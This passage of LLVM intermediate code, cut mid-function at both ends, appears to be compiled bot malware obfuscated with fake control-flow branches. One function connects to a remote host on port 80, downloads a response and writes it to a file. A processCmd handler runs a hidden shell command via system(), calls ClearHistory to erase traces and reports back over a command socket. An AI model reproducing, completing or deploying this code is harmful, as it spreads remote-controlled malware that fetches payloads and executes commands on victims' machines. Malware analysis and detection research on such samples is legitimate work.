  %49 = load i32, i32* @y.118
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  %56 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %57 = load i8*, i8** %12, align 8
  %58 = call i8* @strcpy(i8* %56, i8* %57) #2
  %59 = load i32, i32* @x.117
  %60 = load i32, i32* @y.118
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %67

; <label>:67:                                     ; preds = %originalBBpart24, %42
  store i32 0, i32* %15, align 4
  br label %68

; <label>:68:                                     ; preds = %100, %67
  %69 = load i32, i32* %15, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %72 = call i64 @strlen(i8* %71) #10
  %73 = icmp ult i64 %70, %72
  br i1 %73, label %74, label %97

; <label>:74:                                     ; preds = %68
  %75 = load i32, i32* @x.117
  %76 = load i32, i32* @y.118
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %74
  %83 = load i32, i32* %15, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = icmp ne i32 %87, 47
  %89 = load i32, i32* @x.117
  %90 = load i32, i32* @y.118
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %97

; <label>:97:                                     ; preds = %originalBBpart28, %68
  %98 = phi i1 [ false, %68 ], [ %88, %originalBBpart28 ]
  br i1 %98, label %99, label %103

; <label>:99:                                     ; preds = %97
  br label %100

; <label>:100:                                    ; preds = %99
  %101 = load i32, i32* %15, align 4
  %102 = add nsw i32 %101, 1
  store i32 %102, i32* %15, align 4
  br label %68

; <label>:103:                                    ; preds = %97
  %104 = load i32, i32* @x.117
  %105 = load i32, i32* @y.118
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %103
  %112 = load i32, i32* %15, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 %113
  store i8 0, i8* %114, align 1
  %115 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %115, align 4
  %116 = call zeroext i16 @htons(i16 zeroext 80) #13
  %117 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %116, i16* %117, align 2
  %118 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %119 = call i32 @inet_addr(i8* %118) #2
  %120 = zext i32 %119 to i64
  store i64 %120, i64* %18, align 8
  %121 = icmp eq i64 %120, -1
  %122 = load i32, i32* @x.117
  %123 = load i32, i32* @y.118
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %121, label %130, label %163

; <label>:130:                                    ; preds = %originalBBpart212
  %131 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %132 = call %struct.hostent* @gethostbyname(i8* %131)
  store %struct.hostent* %132, %struct.hostent** %22, align 8
  %133 = icmp eq %struct.hostent* %132, null
  br i1 %133, label %134, label %151

; <label>:134:                                    ; preds = %130
  %135 = load i32, i32* @x.117
  %136 = load i32, i32* @y.118
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %134
  store i32 2, i32* %11, align 4
  %143 = load i32, i32* @x.117
  %144 = load i32, i32* @y.118
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %438

; <label>:151:                                    ; preds = %130
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %153 = bitcast %struct.in_addr* %152 to i8*
  %154 = load %struct.hostent*, %struct.hostent** %22, align 8
  %155 = getelementptr inbounds %struct.hostent, %struct.hostent* %154, i32 0, i32 4
  %156 = load i8**, i8*** %155, align 8
  %157 = getelementptr inbounds i8*, i8** %156, i64 0
  %158 = load i8*, i8** %157, align 8
  %159 = load %struct.hostent*, %struct.hostent** %22, align 8
  %160 = getelementptr inbounds %struct.hostent, %struct.hostent* %159, i32 0, i32 3
  %161 = load i32, i32* %160, align 4
  %162 = sext i32 %161 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %153, i8* %158, i64 %162, i32 1, i1 false)
  br label %168

; <label>:163:                                    ; preds = %originalBBpart212
  %164 = load i64, i64* %18, align 8
  %165 = trunc i64 %164 to i32
  %166 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %167 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %166, i32 0, i32 0
  store i32 %165, i32* %167, align 4
  br label %168

; <label>:168:                                    ; preds = %163, %151
  %169 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %170 = bitcast [8 x i8]* %169 to i8*
  call void @llvm.memset.p0i8.i64(i8* %170, i8 0, i64 8, i32 4, i1 false)
  %171 = load i32, i32* %14, align 4
  %172 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %173 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %173, %struct.sockaddr** %172, align 8
  %174 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %175 = load %struct.sockaddr*, %struct.sockaddr** %174, align 8
  %176 = call i32 @connect(i32 %171, %struct.sockaddr* %175, i32 16)
  %177 = icmp ne i32 %176, 0
  br i1 %177, label %178, label %179

; <label>:178:                                    ; preds = %168
  store i32 1, i32* %11, align 4
  br label %438

; <label>:179:                                    ; preds = %168
  %180 = load i32, i32* %14, align 4
  %181 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %182 = load i32, i32* %15, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds i8, i8* %181, i64 %183
  %185 = getelementptr inbounds i8, i8* %184, i64 1
  %186 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %187 = call i32 (i32, i8*, ...) @sockprintf(i32 %180, i8* getelementptr inbounds ([132 x i8], [132 x i8]* @.str.428, i32 0, i32 0), i8* %185, i8* %186)
  %188 = load i8*, i8** %13, align 8
  %189 = call %struct._IO_FILE* @fopen(i8* %188, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.429, i32 0, i32 0))
  store %struct._IO_FILE* %189, %struct._IO_FILE** %20, align 8
  br label %190

; <label>:190:                                    ; preds = %originalBBpart245, %179
  %191 = load i32, i32* %14, align 4
  %192 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %193 = call i64 @recv(i32 %191, i8* %192, i64 4096, i32 0)
  %194 = trunc i64 %193 to i32
  store i32 %194, i32* %24, align 4
  %195 = icmp sle i32 %194, 0
  br i1 %195, label %196, label %213

; <label>:196:                                    ; preds = %190
  %197 = load i32, i32* @x.117
  %198 = load i32, i32* @y.118
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %196
  %205 = load i32, i32* @x.117
  %206 = load i32, i32* @y.118
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %320

; <label>:213:                                    ; preds = %190
  %214 = load i32, i32* %24, align 4
  %215 = icmp slt i32 %214, 4096
  br i1 %215, label %216, label %220

; <label>:216:                                    ; preds = %213
  %217 = load i32, i32* %24, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i64 0, i64 %218
  store i8 0, i8* %219, align 1
  br label %220

; <label>:220:                                    ; preds = %216, %213
  store i32 0, i32* %16, align 4
  br label %221

; <label>:221:                                    ; preds = %originalBBpart241, %220
  %222 = load i32, i32* %16, align 4
  %223 = load i32, i32* %24, align 4
  %224 = icmp slt i32 %222, %223
  br i1 %224, label %225, label %303

; <label>:225:                                    ; preds = %221
  %226 = load i32, i32* @x.117
  %227 = load i32, i32* @y.118
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %225
  %234 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %235 = load i32, i32* %16, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds i8, i8* %234, i64 %236
  %238 = call i32 @strncmp(i8* %237, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.430, i32 0, i32 0), i64 4) #10
  %239 = icmp ne i32 %238, 0
  %240 = load i32, i32* @x.117
  %241 = load i32, i32* @y.118
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %239, label %267, label %248

; <label>:248:                                    ; preds = %originalBBpart224
  %249 = load i32, i32* %16, align 4
  %250 = add nsw i32 %249, 4
  store i32 %250, i32* %16, align 4
  br label %251

; <label>:251:                                    ; preds = %263, %248
  %252 = load i32, i32* %16, align 4
  %253 = load i32, i32* %24, align 4
  %254 = icmp slt i32 %252, %253
  br i1 %254, label %255, label %266

; <label>:255:                                    ; preds = %251
  %256 = load i32, i32* %16, align 4
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i64 0, i64 %257
  %259 = load i8, i8* %258, align 1
  %260 = sext i8 %259 to i32
  %261 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %262 = call i32 @fputc(i32 %260, %struct._IO_FILE* %261)
  br label %263

; <label>:263:                                    ; preds = %255
  %264 = load i32, i32* %16, align 4
  %265 = add nsw i32 %264, 1
  store i32 %265, i32* %16, align 4
  br label %251

; <label>:266:                                    ; preds = %251
  br label %321

; <label>:267:                                    ; preds = %originalBBpart224
  %268 = load i32, i32* @x.117
  %269 = load i32, i32* @y.118
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %267
  %276 = load i32, i32* @x.117
  %277 = load i32, i32* @y.118
  %278 = sub i32 %276, 1
  %279 = mul i32 %276, %278
  %280 = urem i32 %279, 2
  %281 = icmp eq i32 %280, 0
  %282 = icmp slt i32 %277, 10
  %283 = or i1 %281, %282
  br i1 %283, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %284

; <label>:284:                                    ; preds = %originalBBpart228
  %285 = load i32, i32* @x.117
  %286 = load i32, i32* @y.118
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %284
  %293 = load i32, i32* %16, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %16, align 4
  %295 = load i32, i32* @x.117
  %296 = load i32, i32* @y.118
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBBpart241, label %originalBB30alteredBB

originalBBpart241:                                ; preds = %originalBB30
  br label %221

; <label>:303:                                    ; preds = %221
  %304 = load i32, i32* @x.117
  %305 = load i32, i32* @y.118
  %306 = sub i32 %304, 1
  %307 = mul i32 %304, %306
  %308 = urem i32 %307, 2
  %309 = icmp eq i32 %308, 0
  %310 = icmp slt i32 %305, 10
  %311 = or i1 %309, %310
  br i1 %311, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %303
  %312 = load i32, i32* @x.117
  %313 = load i32, i32* @y.118
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %190

; <label>:320:                                    ; preds = %originalBBpart220
  br label %321

; <label>:321:                                    ; preds = %320, %266
  br label %322

; <label>:322:                                    ; preds = %originalBBpart267, %321
  %323 = load i32, i32* %14, align 4
  %324 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %325 = call i64 @recv(i32 %323, i8* %324, i64 4096, i32 0)
  %326 = trunc i64 %325 to i32
  store i32 %326, i32* %25, align 4
  %327 = icmp sle i32 %326, 0
  br i1 %327, label %328, label %329

; <label>:328:                                    ; preds = %322
  br label %417

; <label>:329:                                    ; preds = %322
  %330 = load i32, i32* %25, align 4
  %331 = icmp slt i32 %330, 4096
  br i1 %331, label %332, label %336

; <label>:332:                                    ; preds = %329
  %333 = load i32, i32* %25, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i64 0, i64 %334
  store i8 0, i8* %335, align 1
  br label %336

; <label>:336:                                    ; preds = %332, %329
  store i32 0, i32* %26, align 4
  br label %337

; <label>:337:                                    ; preds = %originalBBpart263, %336
  %338 = load i32, i32* @x.117
  %339 = load i32, i32* @y.118
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %337
  %346 = load i32, i32* %26, align 4
  %347 = load i32, i32* %25, align 4
  %348 = icmp slt i32 %346, %347
  %349 = load i32, i32* @x.117
  %350 = load i32, i32* @y.118
  %351 = sub i32 %349, 1
  %352 = mul i32 %349, %351
  %353 = urem i32 %352, 2
  %354 = icmp eq i32 %353, 0
  %355 = icmp slt i32 %350, 10
  %356 = or i1 %354, %355
  br i1 %356, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br i1 %348, label %357, label %400

; <label>:357:                                    ; preds = %originalBBpart249
  %358 = load i32, i32* @x.117
  %359 = load i32, i32* @y.118
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %357
  %366 = load i32, i32* %26, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i64 0, i64 %367
  %369 = load i8, i8* %368, align 1
  %370 = sext i8 %369 to i32
  %371 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %372 = call i32 @fputc(i32 %370, %struct._IO_FILE* %371)
  %373 = load i32, i32* @x.117
  %374 = load i32, i32* @y.118
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %381

; <label>:381:                                    ; preds = %originalBBpart253
  %382 = load i32, i32* @x.117
  %383 = load i32, i32* @y.118
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %381
  %390 = load i32, i32* %26, align 4
  %391 = add nsw i32 %390, 1
  store i32 %391, i32* %26, align 4
  %392 = load i32, i32* @x.117
  %393 = load i32, i32* @y.118
  %394 = sub i32 %392, 1
  %395 = mul i32 %392, %394
  %396 = urem i32 %395, 2
  %397 = icmp eq i32 %396, 0
  %398 = icmp slt i32 %393, 10
  %399 = or i1 %397, %398
  br i1 %399, label %originalBBpart263, label %originalBB55alteredBB

originalBBpart263:                                ; preds = %originalBB55
  br label %337

; <label>:400:                                    ; preds = %originalBBpart249
  %401 = load i32, i32* @x.117
  %402 = load i32, i32* @y.118
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %400
  %409 = load i32, i32* @x.117
  %410 = load i32, i32* @y.118
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br label %322

; <label>:417:                                    ; preds = %328
  %418 = load i32, i32* @x.117
  %419 = load i32, i32* @y.118
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %417
  %426 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %427 = call i32 @fclose(%struct._IO_FILE* %426)
  %428 = load i32, i32* %14, align 4
  %429 = call i32 @close(i32 %428)
  store i32 0, i32* %11, align 4
  %430 = load i32, i32* @x.117
  %431 = load i32, i32* @y.118
  %432 = sub i32 %430, 1
  %433 = mul i32 %430, %432
  %434 = urem i32 %433, 2
  %435 = icmp eq i32 %434, 0
  %436 = icmp slt i32 %431, 10
  %437 = or i1 %435, %436
  br i1 %437, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br label %438

; <label>:438:                                    ; preds = %originalBBpart271, %178, %originalBBpart216, %37
  %439 = load i32, i32* %11, align 4
  ret i32 %439

originalBBalteredBB:                              ; preds = %originalBB, %2
  %440 = alloca i32, align 4
  %441 = alloca i8*, align 8
  %442 = alloca i8*, align 8
  %443 = alloca i32, align 4
  %444 = alloca i32, align 4
  %445 = alloca i32, align 4
  %446 = alloca %struct.sockaddr_in, align 4
  %447 = alloca i64, align 8
  %448 = alloca [1024 x i8], align 16
  %449 = alloca %struct._IO_FILE*, align 8
  %450 = alloca [4096 x i8], align 16
  %451 = alloca %struct.hostent*, align 8
  %452 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %453 = alloca i32, align 4
  %454 = alloca i32, align 4
  %455 = alloca i32, align 4
  store i8* %0, i8** %441, align 8
  store i8* %1, i8** %442, align 8
  %456 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %456, i32* %443, align 4
  %457 = icmp eq i32 %456, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  %458 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %459 = load i8*, i8** %12, align 8
  %460 = call i8* @strcpy(i8* %458, i8* %459) #2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %74
  %461 = load i32, i32* %15, align 4
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 %462
  %464 = load i8, i8* %463, align 1
  %465 = sext i8 %464 to i32
  %466 = icmp ne i32 %465, 47
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %103
  %467 = load i32, i32* %15, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 %468
  store i8 0, i8* %469, align 1
  %470 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %470, align 4
  %471 = call zeroext i16 @htons(i16 zeroext 80) #13
  %472 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %471, i16* %472, align 2
  %473 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %474 = call i32 @inet_addr(i8* %473) #2
  %475 = zext i32 %474 to i64
  store i64 %475, i64* %18, align 8
  %476 = icmp eq i64 %475, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %134
  store i32 2, i32* %11, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %196
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %225
  %477 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %478 = load i32, i32* %16, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds i8, i8* %477, i64 %479
  %481 = call i32 @strncmp(i8* %480, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.430, i32 0, i32 0), i64 4) #10
  %482 = icmp ne i32 %481, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %267
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %284
  %483 = load i32, i32* %16, align 4
  %_ = sub i32 %483, 1
  %gen = mul i32 %_, 1
  %_31 = sub i32 %483, 1
  %gen32 = mul i32 %_31, 1
  %_33 = sub i32 0, %483
  %gen34 = add i32 %_33, 1
  %_35 = sub i32 0, %483
  %gen36 = add i32 %_35, 1
  %_37 = shl i32 %483, 1
  %_38 = shl i32 %483, 1
  %_39 = shl i32 %483, 1
  %484 = add nsw i32 %483, 1
  store i32 %484, i32* %16, align 4
  br label %originalBB30

originalBB43alteredBB:                            ; preds = %originalBB43, %303
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %337
  %485 = load i32, i32* %26, align 4
  %486 = load i32, i32* %25, align 4
  %487 = icmp slt i32 %485, %486
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %357
  %488 = load i32, i32* %26, align 4
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i64 0, i64 %489
  %491 = load i8, i8* %490, align 1
  %492 = sext i8 %491 to i32
  %493 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %494 = call i32 @fputc(i32 %492, %struct._IO_FILE* %493)
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %381
  %495 = load i32, i32* %26, align 4
  %_56 = shl i32 %495, 1
  %_57 = sub i32 %495, 1
  %gen58 = mul i32 %_57, 1
  %_59 = sub i32 %495, 1
  %gen60 = mul i32 %_59, 1
  %_61 = shl i32 %495, 1
  %496 = add nsw i32 %495, 1
  store i32 %496, i32* %26, align 4
  br label %originalBB55

originalBB65alteredBB:                            ; preds = %originalBB65, %400
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %417
  %497 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %498 = call i32 @fclose(%struct._IO_FILE* %497)
  %499 = load i32, i32* %14, align 4
  %500 = call i32 @close(i32 %499)
  store i32 0, i32* %11, align 4
  br label %originalBB69
}

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8*, i8*, i64) #1

declare %struct.hostent* @gethostbyname(i8*) #3

declare i32 @fputc(i32, %struct._IO_FILE*) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i8*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i32, align 4
  %45 = alloca i8*, align 8
  %46 = alloca i32, align 4
  %47 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %48 = load i8**, i8*** %4, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 0
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @strcmp(i8* %50, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.431, i32 0, i32 0)) #10
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %110, label %53

; <label>:53:                                     ; preds = %2
  %54 = load i8**, i8*** %4, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 1
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 @strcmp(i8* %56, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.432, i32 0, i32 0)) #10
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %79, label %59

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* @x.119
  %61 = load i32, i32* @y.120
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %59
  %68 = call i32 @system(i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.433, i32 0, i32 0))
  call void @ClearHistory()
  %69 = load i32, i32* @mainCommSock, align 4
  %70 = call i32 (i32, i8*, ...) @sockprintf(i32 %69, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.434, i32 0, i32 0))
  %71 = load i32, i32* @x.119
  %72 = load i32, i32* @y.120
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
